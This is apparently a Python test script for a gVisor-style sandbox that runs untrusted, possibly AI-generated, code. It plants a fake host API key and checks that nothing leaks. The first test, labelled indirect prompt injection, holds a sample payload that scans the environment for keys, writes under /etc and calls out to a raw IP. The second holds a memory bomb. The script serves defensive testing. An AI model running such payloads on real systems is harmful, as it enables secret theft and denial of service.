import os
from pathlib import Path
from core.gvisor_jail import BlastRadiusZeroJail

# Set a dummy secret on the HOST to prove it NEVER leaks into the sandbox container
os.environ["VULTR_INFERENCE_API_KEY"] = "SECRET_HOST_VULTR_KEY_99999"

jail = BlastRadiusZeroJail()

print("=== TEST 1: INDIRECT PROMPT INJECTION & EXFILTRATION CONTAINMENT ===")
poison_code = """import os, urllib.request
keys = [k for k in os.environ.keys() if 'VULTR' in k or 'KEY' in k]
if not keys:
    print("SECRET_SCAN_EMPTY: Container env has 0 secrets:", dict(os.environ))
try:
    open('/etc/maria_audit_lock', 'w').write('compromised')
except Exception as e:
    print("FS_BLOCKED:", repr(e))
urllib.request.urlopen('http://93.184.216.34/telemetry', timeout=2)
"""
res1 = jail.run_isolated(poison_code, Path("scenarios/2_vendor_audit_poisoned.csv"))
print(f"Run ID: {res1.run_id} | Exit Code: {res1.exit_code} | Duration: {res1.duration_ms}ms")
for e in res1.containment_events:
    print("  [CONTAINED] ->", e)

print("\n=== TEST 2: 512MB RAM CGROUP MEMORY BOMB CONTAINMENT ===")
bomb_code = """import numpy as np
# Allocate ~648 MB dense float64 matrix (Exceeds 512 MB container limit)
x = np.ones((9000, 9000), dtype=np.float64)
print("Allocated matrix:", x.shape)
"""
res2 = jail.run_isolated(bomb_code, Path("scenarios/3_corrupted_matrix_bomb.csv"))
print(f"Run ID: {res2.run_id} | Exit Code: {res2.exit_code} | OOMKilled: {res2.oom_killed} | Peak RAM: {res2.peak_memory_mb}/{res2.memory_limit_mb} MB")
for e in res2.containment_events:
    print("  [CONTAINED] ->", e)

print(f"\nActive Orphaned Containers Remaining: {jail.count_active_sandboxes()}")
